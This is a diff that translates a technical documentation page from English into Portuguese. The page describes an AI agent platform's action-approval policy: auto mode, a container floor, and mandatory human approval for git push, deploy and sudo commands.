+  G --&gt; S{terminal toca caminho&lt;br/&gt;fora da pasta do projeto?}
   G2 --&gt; S
-  S --&gt;|yes, and was auto_approve| I2[CAP: require_approval]
-  S --&gt;|no| Z{git_push/pr_open, or terminal requests&lt;br/&gt;git push, PR, deploy, or sudo/doas?}
-  Z --&gt;|yes, and was auto_approve| I3[CAP: require_approval — RN-418]
-  Z --&gt;|no| H{merge into protected branch&lt;br/&gt;or instruction_patch?}
-  H --&gt;|yes, and was auto_approve| I[CAP: require_approval]
-  H --&gt;|no| J[final verdict]
+  S --&gt;|sim, e era auto_approve| I2[TETO: require_approval]
+  S --&gt;|não| Z{git_push/pr_open, ou terminal pede&lt;br/&gt;git push, PR, deploy ou sudo/doas?}
+  Z --&gt;|sim, e era auto_approve| I3[TETO: require_approval — RN-418]
+  Z --&gt;|não| H{merge em branch protegida&lt;br/&gt;ou instruction_patch?}
+  H --&gt;|sim, e era auto_approve| I[TETO: require_approval]
+  H --&gt;|não| J[veredito final]
 </pre>
-<p><strong>Node <code>Z</code> changed position</strong> (<a href="../business-rules/api.html#rn-418">RN-418</a>,
-revises <a href="../business-rules/api.html#rn-106">RN-106</a>): until the introduction of
-the local runner, it sat right after IAM and returned <code>deny</code> — now it's a
-CAP, in the same final block as the other three, applied after
-<code>agent_autonomy</code> and <code>permissions.json</code> have already given their opinion.
-See the section
-<a href="#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418">&quot;The boundary of external effect and privileged command&quot;</a>
-below for why.</p>
-<h3 id="auto-mode-the-agent_autonomy-wildcard-rn-153">&quot;Auto mode&quot;: the <code>agent_autonomy</code> wildcard (<a href="../business-rules/api.html#rn-153">RN-153</a>)</h3>
-<p>The <code>agent_autonomy has an opinion?</code> node in the diagram above doesn't
-know, and doesn't need to know, whether the opinion came from a SPECIFIC
-rule (<code>actionType: &quot;terminal&quot;</code>) or from the <code>actionType: &quot;*&quot;</code> wildcard —
-&quot;auto mode&quot;: autonomy for ANY type of action by that agent, turned on with
-a click on &quot;Automatic mode&quot; in the <code>ApprovalCard</code>. The resolution happens
-BEFORE this diagram begins, in a single repository:
-<code>DrizzleAgentAutonomyRepository.findMode</code> looks up the specific rule and
-the wildcard in the same query, and returns the specific one when both
-exist — writing <code>terminal: deny</code> with <code>&quot;*&quot;: auto_approve</code> turned on still
-denies <code>terminal</code> for that agent, while freeing up the rest.</p>
-<p>That's why the diagram didn't get a new node, and the caps, right below,
-apply to &quot;auto mode&quot; because they react to <code>current.policy === 'auto_approve'</code>, never to its origin
-(<a href="../business-rules/api.html#rn-154">RN-154</a>).</p>
-<p><strong>One exception, decided by the product owner: auto mode frees the path
-scope</strong> (<a href="../business-rules/api.html#rn-603">RN-603</a>,
-<a href="../adr/0167-modo-automatico-libera-o-escopo-de-caminho.html">ADR 0167</a>).
-The repository also returns WHERE the autonomy came from
-(<code>AgentAutonomyRepository.resolve</code>: <code>especifica</code> or <code>curinga</code>), and
-<code>decide()</code> receives it as <code>ctx.autonomyOrigin</code>. When the wildcard resolves
-to <code>auto_approve</code>, two approval requests go away: the <a href="#path-scope">path-scope
-cap</a> and the <code>require_approval</code> a compound command synthesises
-for a segment with no rule at all. So an agent in auto mode runs any
-terminal command, even outside the project folder — measured on <code>exp001</code>,
-47 of 51 requests after auto mode was on came only from the scope, because
-the dev agent runs inside the container (<code>/work</code>) and the scope compares
-against the HOST root. Everything else stays: <code>deny</code> wins, an <code>ask</code> written
-in the file asks, the external-effect/privileged cap (push, PR, deploy,
-<code>sudo</code>/<code>doas</code>) runs first and ignores the origin, and protected-branch
-merge, <code>instruction_patch</code>, parallelism and <code>container_remove</code> never
-auto-approve. A SPECIFIC rule (<code>terminal: auto_approve</code> or
-<code>terminal: require_approval</code>) is not auto mode and keeps the scope cap.</p>
-<p>When a <code>git_merge</code> the human approved EXECUTES and the provider reports the PR
-as <code>merged</code>, the task that PR came from moves to <code>done</code> — once: a repeated merge
-of the same PR does not move it again or record a second
-<code>backlog.task_status_changed</code> event (<a href="../business-rules/api.html#rn-628">RN-628</a>). The
-merge itself is never automated (<a href="../business-rules/api.html#rn-418">RN-418</a>).</p>
-<p>A <code>git_merge</code> is REFUSED before it is created when the same PR was already
-merged by an earlier execution (409 <code>pr_ja_mergeado</code>) or already has a live
-proposal — pending, approved or auto-approved (409 <code>merge_ja_proposto</code>); a
-denied or failed one does not block trying again. Approving a pending merge
-whose PR another proposal already merged is also 409 <code>pr_ja_mergeado</code>, and the
-action stays <code>pending</code>. A QA/SecOps gate still pending is NOT a refusal: the
-PRs tab and the chat only WARN, naming the gate, and the button stays enabled
+<p><strong>O nó <code>Z</code> mudou de posição</strong> (<a href="../business-rules/api.html#rn-418">RN-418</a>, revisa
+a <a href="../business-rules/api.html#rn-106">RN-106</a>): até a chegada do
+runner local, ele ficava logo depois do IAM e devolvia <code>deny</code> — agora é um
+TETO, no mesmo bloco final dos outros três, aplicado depois de
+<code>agent_autonomy</code> e <code>permissions.json</code> já terem opinado. Veja a seção
+<a href="#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418">&quot;A fronteira de efeito externo e comando privilegiado&quot;</a>
+abaixo para o porquê.</p>
+<h3 id="modo-automático-a-curinga-do-agent_autonomy-rn-153">&quot;Modo automático&quot;: a curinga do <code>agent_autonomy</code> (<a href="../business-rules/api.html#rn-153">RN-153</a>)</h3>
+<p>O nó <code>agent_autonomy tem opinião?</code> do diagrama acima não sabe, e não precisa
+saber, se a opinião veio de uma regra ESPECÍFICA (<code>actionType: &quot;terminal&quot;</code>) ou
+da curinga <code>actionType: &quot;*&quot;</code> — o &quot;modo automático&quot;: autonomia para QUALQUER
+tipo de ação daquele agente, ligada com um clique em &quot;Modo automático&quot; no
+<code>ApprovalCard</code>. A resolução acontece ANTES de este diagrama começar, num
+repositório só: <code>DrizzleAgentAutonomyRepository.findMode</code> procura a regra
+específica e a curinga na mesma consulta, e devolve a específica quando as duas
+existem — gravar <code>terminal: deny</code> com <code>&quot;*&quot;: auto_approve</code> ligado continua
+negando <code>terminal</code> para aquele agente, enquanto libera o resto.</p>
+<p>Por isso o diagrama não ganhou nó novo, e os tetos, logo abaixo, valem para o
+&quot;modo automático&quot; porque reagem a <code>current.policy === 'auto_approve'</code>, nunca à
+origem dele (<a href="../business-rules/api.html#rn-154">RN-154</a>).</p>
+<p><strong>Uma exceção, decidida pelo dono do produto: o modo automático libera o
+escopo de caminho</strong> (<a href="../business-rules/api.html#rn-603">RN-603</a>,
+<a href="../adr/0167-modo-automatico-libera-o-escopo-de-caminho.html">ADR 0167</a>). O
+repositório devolve também DE ONDE a autonomia veio
+(<code>AgentAutonomyRepository.resolve</code>: <code>especifica</code> ou <code>curinga</code>), e <code>decide()</code> a
+recebe como <code>ctx.autonomyOrigin</code>. Quando a curinga resolve para
+<code>auto_approve</code>, dois pedidos de aprovação somem: o <a href="#path-scope">teto de escopo de
+caminho</a> e o <code>require_approval</code> que um comando composto sintetiza
+para um segmento sem regra nenhuma. Então um agente em modo automático roda
+qualquer comando de terminal, mesmo fora da pasta do projeto — medido no
+<code>exp001</code>, 47 de 51 pedidos depois de o modo automático ser ligado vinham só do
+escopo, porque o dev agent roda dentro do container (<code>/work</code>) e o escopo
+compara com a raiz do HOST. Todo o resto fica: <code>deny</code> vence, um <code>ask</code> escrito
+no arquivo pergunta, o teto de efeito externo/privilegiado (push, PR, deploy,
+<code>sudo</code>/<code>doas</code>) roda primeiro e ignora a origem, e merge em branch protegida,
+<code>instruction_patch</code>, paralelismo e <code>container_remove</code> nunca auto-aprovam. Uma
+regra ESPECÍFICA (<code>terminal: auto_approve</code> ou <code>terminal: require_approval</code>)
+não é modo automático e mantém o teto de escopo.</p>
+<p>Quando um <code>git_merge</code> que o humano aprovou EXECUTA e o provider informa a PR
+como <code>merged</code>, a tarefa de onde a PR veio passa a <code>done</code> — uma vez: um merge
+repetido da mesma PR não a move de novo nem grava um segundo evento
+<code>backlog.task_status_changed</code> (<a href="../business-rules/api.html#rn-628">RN-628</a>). O merge
+em si nunca é automatizado (<a href="../business-rules/api.html#rn-418">RN-418</a>).</p>
+<p>Um <code>git_merge</code> é RECUSADO antes de ser criado quando a mesma PR já foi mergeada
+por uma execução anterior (409 <code>pr_ja_mergeado</code>) ou já tem uma proposta viva —
+pendente, aprovada ou auto-aprovada (409 <code>merge_ja_proposto</code>); uma negada ou
+falhada não impede tentar de novo. Aprovar um merge pendente cuja PR outra
+proposta já mergeou também é 409 <code>pr_ja_mergeado</code>, e a ação fica <code>pending</code>. Um
+gate de QA/SecOps ainda pendente NÃO é recusa: a aba de PRs e o chat só
+AVISAM, nomeando o gate, e o botão fica habilitado
 (<a href="../business-rules/api.html#rn-663">RN-663</a>).</p>
-<p>&quot;Auto mode&quot; requires <code>maintainer</code> — the same role that already protected
-<code>PUT .../agent-autonomy</code> before the wildcard existed. Turning it off
-reuses the manual/auto toggle the agent card already had in
-Overview/Executors: with the wildcard written, the toggle switches to
-editing IT instead of the usual representative type, and &quot;manual&quot; on it is
-the same wildcard rewritten as <code>require_approval</code>.</p>
-<h3 id="the-container-floor-rn-492rn-493-adr-0134">The container floor (<a href="../business-rules/engine.html#rn-492">RN-492</a>/<a href="../business-rules/api.html#rn-493">RN-493</a>, <a href="../adr/0134-dev-agents-executam-dentro-do-container.html">ADR 0134</a>)</h3>
-<p>Node <code>C0</code> in the diagram above is new: when the action is <code>terminal</code> AND the
-project has a container REGISTERED as <code>running</code> in <code>project_containers</code>
-(<code>execution_mode: container</code> — checked by <code>ProposeActionUseCase</code>, which
-already reads the same container lifecycle the execution side reads), the
-BASE value stops being <code>require_approval</code> and starts as <code>auto_approve</code>.</p>
-<p>This is a floor, not a new cap, and the distinction matters: every stage
-that follows (<code>agent_autonomy</code>, <code>permissions.json</code>) already REPLACES the
-base value when it has an explicit opinion — that's the same mechanism
-that already let a <code>deny</code> rule or an <code>ask</code> pattern override the default
-<code>require_approval</code> today. Starting from <code>auto_approve</code> instead of
-<code>require_approval</code> doesn't change that property: an explicit <code>deny</code> or a
-matching <code>ask</code> pattern still wins over the floor exactly like it already
-won over the default. And the four caps below (<code>S</code>, <code>Z</code>, <code>H</code>, and the
-compound-command rule) keep applying on top, unconditionally, whether the
-<code>auto_approve</code> came from the floor or from an explicit rule — <code>git push</code>
-inside a running container is still <code>require_approval</code>, same as always.</p>
-<p><strong>Why this is safe: a second, stronger boundary, not the absence of one.</strong>
-Outside a container, the LEXICAL path scope below (<code>comandoNoEscopo</code>
-against <code>projectScopeRoot</code>, a HOST path) is what makes auto-approving via
-<code>permissions.json allow</code> safe. Inside the real container, the command
-physically cannot see anything outside <code>/work</code> — Docker's mount namespace
-— and the broker independently re-validates <code>cwd</code> is inside <code>/work</code>
-before running anything (<code>DiretorioForaDoEscopoError</code>). <strong>The lexical path
-scope still runs on top of the floor, unchanged</strong>: <code>cwd</code>/<code>command</code> reaching
-<code>decide()</code> are never translated to <code>/work</code> (that translation happens later,
-on the engine side, right before calling the broker), so a command that
-would be flagged out-of-scope today is still flagged out-of-scope with the
-floor on — it's redundant defense-in-depth, not a replacement.</p>
-<h2 id="a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418">The boundary of external effect and privileged command (RN-418)</h2>
-<p><strong>Revision of <a href="../adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica.html">ADR 0065</a>
-by <a href="../adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny.html">ADR 0102</a></strong>
-— a GLOBAL and explicit decision by the product owner, confirmed after an
-automatic security warning about the change (the full history is in the
-ADR). What follows describes the CURRENT behavior; the previous version
-(unconditional <code>deny</code>, applied before any permissive stage) was replaced,
-not loosened — see why right below.</p>
-<p><code>git push</code>, <code>git remote add</code>/<code>set-url</code>, <code>git merge</code>, the provider CLIs
-(<code>gh pr create</code>, <code>gh pr merge</code>, <code>glab mr create</code>/<code>merge</code>, releases and
-workflow dispatch), common deploy commands (<code>kubectl apply</code>, <code>helm upgrade</code>, <code>terraform apply</code>, <code>docker push</code>, <code>npm publish</code>, ...) and now
-also <code>sudo</code>/<code>doas</code> in a <code>terminal</code> command are an <strong>ABSOLUTE CAP</strong> (and,
-since <a href="../business-rules/api.html#rn-689">RN-689</a>, so are the TYPED <code>git_push</code> and
-<code>pr_open</code> actions, which until then the <code>&quot;*&quot;</code> wildcard, a specific rule or
-<code>permissions.json</code> promoted to <code>auto_approve</code>) — in the
-same final block as the other three caps (see <a href="#caps">&quot;Caps&quot;</a> below),
-applied after <code>agent_autonomy</code> and <code>permissions.json</code> have already given
-their opinion: if the verdict up to that point was <code>auto_approve</code>, it
-becomes unconditional <code>require_approval</code>. Neither the <code>&quot;*&quot;</code> wildcard for
-&quot;automatic mode&quot; nor an <code>allow</code> entry in <code>permissions.json</code> can promote it
-back.</p>
-<p><strong>Why <code>require_approval</code> is now safe, when before it required <code>deny</code>.</strong>
-The historical reason for the <code>deny</code> was concrete: &quot;always allow&quot; writes
-the pattern into <code>allow</code>, and a single click would be enough to reopen the
-door forever. That gap was closed AT THE SOURCE, not worked around:
+<p>O &quot;modo automático&quot; exige <code>maintainer</code> — o mesmo papel que já protegia
+<code>PUT .../agent-autonomy</code> antes de a curinga existir. Desligá-lo reusa o toggle
+manual/auto que o card do agente já tinha em Visão geral/Executores: com a
+curinga gravada, o toggle passa a editar ELA em vez do tipo representativo de
+sempre, e &quot;manual&quot; nele é a mesma curinga regravada como <code>require_approval</code>.</p>
+<h3 id="o-piso-do-container-rn-492rn-493-adr-0134">O piso do container (<a href="../business-rules/engine.html#rn-492">RN-492</a>/<a href="../business-rules/api.html#rn-493">RN-493</a>, <a href="../adr/0134-dev-agents-executam-dentro-do-container.html">ADR 0134</a>)</h3>
+<p>O nó <code>C0</code> do diagrama acima é novo: quando a ação é <code>terminal</code> E o projeto tem
+um container REGISTRADO como <code>running</code> em <code>project_containers</code>
+(<code>execution_mode: container</code> — conferido por <code>ProposeActionUseCase</code>, que já lê
+o mesmo ciclo de vida do container que o lado da execução lê), o valor BASE
+deixa de ser <code>require_approval</code> e começa como <code>auto_approve</code>.</p>
+<p>Isto é um piso, não um teto novo, e a distinção importa: toda etapa seguinte
+(<code>agent_autonomy</code>, <code>permissions.json</code>) já SUBSTITUI o valor base quando tem
+opinião explícita — é o mesmo mecanismo que já deixava uma regra <code>deny</code> ou um
+padrão <code>ask</code> sobrepor o <code>require_approval</code> padrão hoje. Partir de
+<code>auto_approve</code> em vez de <code>require_approval</code> não muda essa propriedade: um
+<code>deny</code> explícito ou um padrão <code>ask</code> que casa continua vencendo o piso
+exatamente como já vencia o padrão. E os quatro tetos abaixo (<code>S</code>, <code>Z</code>, <code>H</code> e
+a regra do comando composto) continuam valendo por cima, incondicionalmente,
+venha o <code>auto_approve</code> do piso ou de uma regra explícita — <code>git push</code> dentro de
+um container em execução continua <code>require_approval</code>, como sempre.</p>
+<p><strong>Por que isto é seguro: uma segunda fronteira, mais forte, não a ausência de
+uma.</strong> Fora de um container, o escopo de caminho LÉXICO abaixo
+(<code>comandoNoEscopo</code> contra <code>projectScopeRoot</code>, um caminho do HOST) é o que torna
+seguro auto-aprovar via <code>permissions.json allow</code>. Dentro do container real, o
+comando fisicamente não enxerga nada fora de <code>/work</code> — o mount namespace do
+Docker — e o broker revalida de forma independente que o <code>cwd</code> está dentro de
+<code>/work</code> antes de rodar qualquer coisa (<code>DiretorioForaDoEscopoError</code>). <strong>O
+escopo de caminho léxico continua rodando por cima do piso, sem mudança</strong>:
+<code>cwd</code>/<code>command</code> que chegam a <code>decide()</code> nunca são traduzidos para <code>/work</code> (essa
+tradução acontece depois, do lado do engine, logo antes de chamar o broker),
+então um comando que hoje seria marcado fora do escopo continua marcado fora do
+escopo com o piso ligado — é defesa em profundidade redundante, não
+substituição.</p>
+<h2 id="a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418">A fronteira de efeito externo e comando privilegiado (RN-418)</h2>
+<p><strong>Revisão do <a href="../adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica.html">ADR 0065</a>
+pelo <a href="../adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny.html">ADR 0102</a></strong>
+— uma decisão GLOBAL e explícita do dono do produto, confirmada depois de um
+aviso automático de segurança sobre a mudança (o histórico inteiro está no
+ADR). O que segue descreve o comportamento ATUAL; a versão anterior (<code>deny</code>
+incondicional, aplicado antes de qualquer etapa permissiva) foi substituída,
+não afrouxada — veja o porquê logo abaixo.</p>
+<p><code>git push</code>, <code>git remote add</code>/<code>set-url</code>, <code>git merge</code>, as CLIs dos providers
+(<code>gh pr create</code>, <code>gh pr merge</code>, <code>glab mr create</code>/<code>merge</code>, releases e
+workflow dispatch), comandos comuns de deploy (<code>kubectl apply</code>, <code>helm upgrade</code>, <code>terraform apply</code>, <code>docker push</code>, <code>npm publish</code>, ...) e agora
+também <code>sudo</code>/<code>doas</code> num comando de <code>terminal</code> são um <strong>TETO ABSOLUTO</strong> (e,
+desde a <a href="../business-rules/api.html#rn-689">RN-689</a>, também as ações TIPADAS
+<code>git_push</code> e <code>pr_open</code>, que até então a curinga <code>&quot;*&quot;</code>, uma regra específica ou
+o <code>permissions.json</code> promoviam a <code>auto_approve</code>) — no mesmo bloco final dos
+outros três tetos (veja <a href="#caps">&quot;Tetos&quot;</a> abaixo), aplicado depois de
+<code>agent_autonomy</code> e <code>permissions.json</code> já terem opinado: se o veredito até ali
+era <code>auto_approve</code>, ele vira <code>require_approval</code> incondicional. Nem a curinga
+<code>&quot;*&quot;</code> do &quot;modo automático&quot; nem uma entrada <code>allow</code> no <code>permissions.json</code>
+conseguem promovê-lo de volta.</p>
+<p><strong>Por que <code>require_approval</code> agora é seguro, quando antes exigia <code>deny</code>.</strong> O
+motivo histórico do <code>deny</code> era concreto: &quot;sempre permitir&quot; grava o padrão no
+<code>allow</code>, e um único clique bastaria para reabrir a porta para sempre. Essa
+brecha foi fechada NA FONTE, não contornada:
 <code>ApproveAlwaysActionUseCase</code>/<code>patternsForAction</code>
 (<code>src/application/use-cases/actions/approve-always-action.use-case.ts</code>)
-REFUSE to write a pattern into <code>allow</code> for a terminal action with git
-external effect or a privileged command — the user still approves the
-specific instance through the normal flow, but &quot;always allow&quot; never writes
-the pattern for these two cases. Without this refusal, the cap would be
-decorative.</p>
-<p><code>sudo</code>/<code>doas</code> got their own category in <code>external-effect.ts</code>
-(<code>comandoPrivilegiadoNoComando</code>), matching by VERB in any segment — same
-principle as <code>efeitoExternoNoComando</code> for git, which continues matching by
-<strong>token prefix</strong>, ignoring global flags in the middle (<code>git -C /tmp push</code>
-matches <code>git push</code>). Each segment of a compound command is checked: <code>pnpm test &amp;&amp; git push origin main</code> is blocked by the second segment, the same
-way a compound command already requires every segment to match to become
+RECUSAM gravar padrão no <code>allow</code> para ação de terminal com efeito externo de
+git ou comando privilegiado — o usuário continua aprovando a instância
+específica pelo fluxo normal, mas &quot;sempre permitir&quot; nunca grava o padrão nesses
+dois casos. Sem essa recusa, o teto seria decorativo.</p>
+<p><code>sudo</code>/<code>doas</code> ganharam categoria própria em <code>external-effect.ts</code>
+(<code>comandoPrivilegiadoNoComando</code>), casando pelo VERBO em qualquer segmento —
+mesmo princípio de <code>efeitoExternoNoComando</code> para git, que continua casando por
+<strong>prefixo de token</strong>, ignorando flags globais no meio (<code>git -C /tmp push</code> casa
+com <code>git push</code>). Cada segmento de um comando composto é conferido: <code>pnpm test &amp;&amp; git push origin main</code> é barrado pelo segundo segmento, do mesmo jeito
+que um comando composto já exige que todo segmento case para virar
 <code>auto_approve</code>.</p>
-<p>The cap doesn't take power away from the agent: for git, the error message
-keeps pointing to which <strong>typed</strong> action to use — <code>git_push</code>, <code>git_merge</code>
-or <code>pr_open</code> — which is born a <code>proposed_action</code>, follows the normal
-pipeline, and records in the event log what was pushed and to where (it's
-the path the dev agent already uses today, <code>agent_io.ex</code>). <code>sudo</code>/<code>doas</code>
-don't have an equivalent typed action — the message just explains why that
-command requires a human decision.</p>
-<p><strong>Where this matters most now</strong>: the
-<a href="../adr/0103-runner-local-execucao-na-maquina-do-usuario.html">local runner</a>
-executes ALREADY approved commands on the user's own machine, with their
-own privileges — it's exactly the scenario where a legitimate <code>sudo</code> (or
-an attempt to escape via <code>sudo</code>) needs a human stop guaranteed by
-construction, not by <code>permissions.json</code> convention.</p>
+<p>O teto não tira poder do agente: para git, a mensagem de erro continua
+apontando qual ação <strong>tipada</strong> usar — <code>git_push</code>, <code>git_merge</code> ou <code>pr_open</code> —,
+que nasce <code>proposed_action</code>, segue o pipeline normal e grava no event log o que
+foi enviado e para onde (é o caminho que o dev agent já usa hoje,
+<code>agent_io.ex</code>). <code>sudo</code>/<code>doas</code> não têm ação tipada equivalente — a mensagem só
+explica por que aquele comando exige decisão humana.</p>
+<p><strong>Onde isto mais importa agora</strong>: o
+<a href="../adr/0103-runner-local-execucao-na-maquina-do-usuario.html">runner local</a>
+executa comandos JÁ aprovados na própria máquina do usuário, com os
+privilégios dele — é exatamente o cenário em que um <code>sudo</code> legítimo (ou uma
+tentativa de escapar via <code>sudo</code>) precisa de uma parada humana garantida por
+construção, não por convenção do <code>permissions.json</code>.</p>
 <p><strong><code>container_remove</code> (ADR 0136, <a href="../business-rules/api.html#rn-495">RN-495</a>)
-joins the same &quot;always allow&quot; refusal</strong>, by a simpler mechanism than the
-one above: it isn't a <code>terminal</code> command matched by token, it's its own
-<code>actionType</code>, so <code>ApproveAlwaysActionUseCase</code> refuses the click outright
-for that type — no pattern is ever written, and the user approves the
-specific instance through the normal flow instead. <code>container_start</code> and
-<code>container_stop</code> are NOT refused this way: they can be configured
-<code>auto_approve</code>, same calibre as <code>open_adr_pr</code>/<code>open_infra_pr</code> —
-<code>container_stop</code> is never seeded, and <code>container_start</code> is seeded for the
-Infra agent on its handoff accept since ADR 0190.</p>
-<p><strong>Order of an &quot;always allow&quot; click (<a href="../business-rules/api.html#rn-642">RN-642</a>).</strong>
-The approval and the pattern are recorded in the SAME transaction: the
-pattern (in <code>allow</code>, or in <code>agent_autonomy</code> for a module dev agent) and its
-<code>permission.granted</code> event are written only after the transition out of
-<code>pending</code> is valid, and a pattern that fails to write undoes the approval.
-The <code>permissions.json</code> is a file and cannot join the transaction — the
-residual window is the commit failing after the file was written, declared.
-Clicking an action that already left <code>pending</code> by an APPROVAL (a double
-click, the same pending action shown in two panels) is idempotent success,
-<code>desfecho: &quot;ja_aprovada&quot;</code>, which records the pattern only if it is missing;
-clicking a DENIED action is still <code>409</code> with <code>reason: &quot;acao_ja_recusada&quot;</code>
-and writes nothing. The caps above are checked before any of this, even for
-an action that was already approved.</p>
-<p><strong>The TYPED half of the cap (AT-320).</strong> Until 30/09 only the typed-in
-<code>git push</code> command was refused; a typed <code>git_push</code> action went through and
-wrote <code>GitPush()</code> into <code>allow</code>. &quot;Always allow&quot; now refuses, by type, the
-single list <code>TIPOS_SEM_SEMPRE_PERMITIR</code>
+entra na mesma recusa de &quot;sempre permitir&quot;</strong>, por um mecanismo mais simples
+que o de cima: ele não é comando de <code>terminal</code> casado por token, é um
+<code>actionType</code> próprio, então <code>ApproveAlwaysActionUseCase</code> recusa o clique de
+saída para esse tipo — nenhum padrão é gravado, e o usuário aprova a instância
+específica pelo fluxo normal. <code>container_start</code> e <code>container_stop</code> NÃO são
+recusados assim: podem ser configurados <code>auto_approve</code>, mesmo calibre de
+<code>open_adr_pr</code>/<code>open_infra_pr</code> — <code>container_stop</code> nunca é semeado, e
+<code>container_start</code> é semeado para o agente de Infra no aceite do handoff dele
+desde o ADR 0190.</p>
+<p><strong>Ordem de um clique em &quot;sempre permitir&quot; (<a href="../business-rules/api.html#rn-642">RN-642</a>).</strong>
+A aprovação e o padrão são gravados na MESMA transação: o padrão (no <code>allow</code>,
+ou no <code>agent_autonomy</code> para um dev agent de módulo) e o evento
+<code>permission.granted</code> dele só são escritos depois de a transição para fora de
+<code>pending</code> ser válida, e um padrão que falha ao gravar desfaz a aprovação. O
+<code>permissions.json</code> é arquivo e não entra na transação — a janela residual é o
+commit falhar depois de o arquivo ter sido escrito, declarada. Clicar numa ação
+que já saiu de <code>pending</code> por uma APROVAÇÃO (um duplo clique, a mesma ação
+pendente mostrada em dois painéis) é sucesso idempotente,
+<code>desfecho: &quot;ja_aprovada&quot;</code>, que grava o padrão só se ele falta; clicar numa ação
+NEGADA continua <code>409</code> com <code>reason: &quot;acao_ja_recusada&quot;</code> e não grava nada. Os
+tetos acima são conferidos antes de tudo isso, mesmo para uma ação que já foi
+aprovada.</p>
+<p><strong>A metade TIPADA do teto (AT-320).</strong> Até 30/09 só o comando digitado
+<code>git push</code> era recusado; uma ação tipada <code>git_push</code> passava e gravava
+<code>GitPush()</code> no <code>allow</code>. &quot;Sempre permitir&quot; agora recusa, por tipo, a lista
+única <code>TIPOS_SEM_SEMPRE_PERMITIR</code>
 (<code>src/domain/actions/sempre-permitir.ts</code>): <code>git_push</code>, <code>pr_open</code>,
-<code>git_merge</code>, <code>container_remove</code>, <code>instruction_patch</code>, <code>parallelize</code> and
-<code>raise_max_parallel</code> — <code>400</code> with <code>reason: &quot;teto_do_sempre_permitir&quot;</code>. The
-approval card hides the button for the same list (a copy checked against
-this one by test). When it shipped, this did NOT change <code>decide()</code> nor what
-activating execution seeds; since <a href="../business-rules/api.html#rn-689">RN-689</a> both
-changed: <code>git_push</code> and <code>pr_open</code> are inside the RN-418 cap in <code>decide()</code>
-(see <a href="#caps">&quot;Caps&quot;</a>), and activating execution seeds only <code>git_commit</code> as
-<code>auto_approve</code> for each <code>dev-&lt;module&gt;</code>.</p>
-<p><strong>The unit of the recorded pattern: verb + subcommand, one per segment
-(<a href="../business-rules/api.html#rn-675">RN-675</a>, owner decision 01/10).</strong> &quot;Always
-allow&quot; no longer records the whole command byte by byte: each segment of
-the command (split on <code>&amp;&amp;</code>, <code>||</code>, <code>;</code>, <code>|</code>, <code>&amp;</code>, as <code>decide()</code> splits it)
-becomes one pattern — the verb plus its subcommand when the second token is
-a word (<code>npm test</code>, <code>git status</code>, <code>mix test</code>, <code>npx vitest</code>), the verb alone
-when it is an argument that is not a word (<code>cat src/x.ts</code> → <code>Terminal(cat)</code>,
-<code>cd ../lib</code> → <code>Terminal(cd)</code>), and the EXACT segment when the second token is
-a flag (<code>ls -la src</code>) or when the unit would be a prefix of an RN-418 cap
-(<code>git remote -v</code>, <code>gh pr list</code> stay exact). A segment that is a cap prefix
-even when exact (<code>git</code> alone) records nothing. <code>cd src/app &amp;&amp; npm test</code>
-records <code>Terminal(cd)</code> and <code>Terminal(npm test)</code>, and the next
-<code>cd lib/core &amp;&amp; npm test -- --coverage</code> runs without asking. Matching is
-still by token prefix, the caps still run after the file in <code>decide()</code>, and
-the path scope still applies outside auto mode. A module dev agent's click
-still goes to <code>agent_autonomy</code>, not to a pattern (<a href="../business-rules/api.html#rn-509">RN-509</a>).</p>
-<h2 id="path-scope">Path scope</h2>
-<p>A <code>terminal</code> command is also evaluated by <strong>where it touches</strong>, not just
-by the verb (<a href="../adr/0055-escopo-de-caminho-na-politica-de-terminal.html">ADR 0055</a>,
-<a href="../business-rules/api.html#rn-075">RN-075</a>). The project folder —
-<code>&lt;PROJECT_WORKSPACES_ROOT&gt;/&lt;workspace_dir_name&gt;</code>, where <code>permissions.json</code>
-and all agent worktrees live — is the <strong>scope</strong>. <code>workspace_dir_name</code>
+<code>git_merge</code>, <code>container_remove</code>, <code>instruction_patch</code>, <code>parallelize</code> e
+<code>raise_max_parallel</code> — <code>400</code> com <code>reason: &quot;teto_do_sempre_permitir&quot;</code>. O card
+de aprovação esconde o botão para a mesma lista (uma cópia conferida contra
+esta por teste). Quando entrou, isto NÃO mudou <code>decide()</code> nem o que a ativação
+da execução semeia; desde a <a href="../business-rules/api.html#rn-689">RN-689</a> os dois
+mudaram: <code>git_push</code> e <code>pr_open</code> estão dentro do teto da RN-418 em <code>decide()</code>
+(veja <a href="#caps">&quot;Tetos&quot;</a>), e ativar a execução semeia só <code>git_commit</code> como
+<code>auto_approve</code> para cada <code>dev-&lt;modulo&gt;</code>.</p>
+<p><strong>A unidade do padrão gravado: verbo + subcomando, um por segmento
+(<a href="../business-rules/api.html#rn-675">RN-675</a>, decisão do dono de 01/10).</strong> &quot;Sempre
+permitir&quot; não grava mais o comando inteiro byte a byte: cada segmento do
+comando (dividido em <code>&amp;&amp;</code>, <code>||</code>, <code>;</code>, <code>|</code>, <code>&amp;</code>, como <code>decide()</code> o divide) vira
+um padrão — o verbo mais o subcomando quando o segundo token é uma palavra
+(<code>npm test</code>, <code>git status</code>, <code>mix test</code>, <code>npx vitest</code>), o verbo sozinho quando é
+um argumento que não é palavra (<code>cat src/x.ts</code> → <code>Terminal(cat)</code>,
+<code>cd ../lib</code> → <code>Terminal(cd)</code>), e o segmento EXATO quando o segundo token é uma
+flag (<code>ls -la src</code>) ou quando a unidade seria prefixo de um teto da RN-418
+(<code>git remote -v</code>, <code>gh pr list</code> ficam exatos). Um segmento que é prefixo de teto
+mesmo exato (<code>git</code> sozinho) não grava nada. <code>cd src/app &amp;&amp; npm test</code> grava
+<code>Terminal(cd)</code> e <code>Terminal(npm test)</code>, e o próximo
+<code>cd lib/core &amp;&amp; npm test -- --coverage</code> roda sem perguntar. O casamento
+continua por prefixo de token, os tetos continuam rodando depois do arquivo em
+<code>decide()</code>, e o escopo de caminho continua valendo fora do modo automático. O
+clique de um dev agent de módulo continua indo para o <code>agent_autonomy</code>, não
+para um padrão (<a href="../business-rules/api.html#rn-509">RN-509</a>).</p>
+<h2 id="path-scope">Escopo de caminho</h2>
+<p>Um comando de <code>terminal</code> é avaliado também por <strong>onde ele toca</strong>, não só pelo
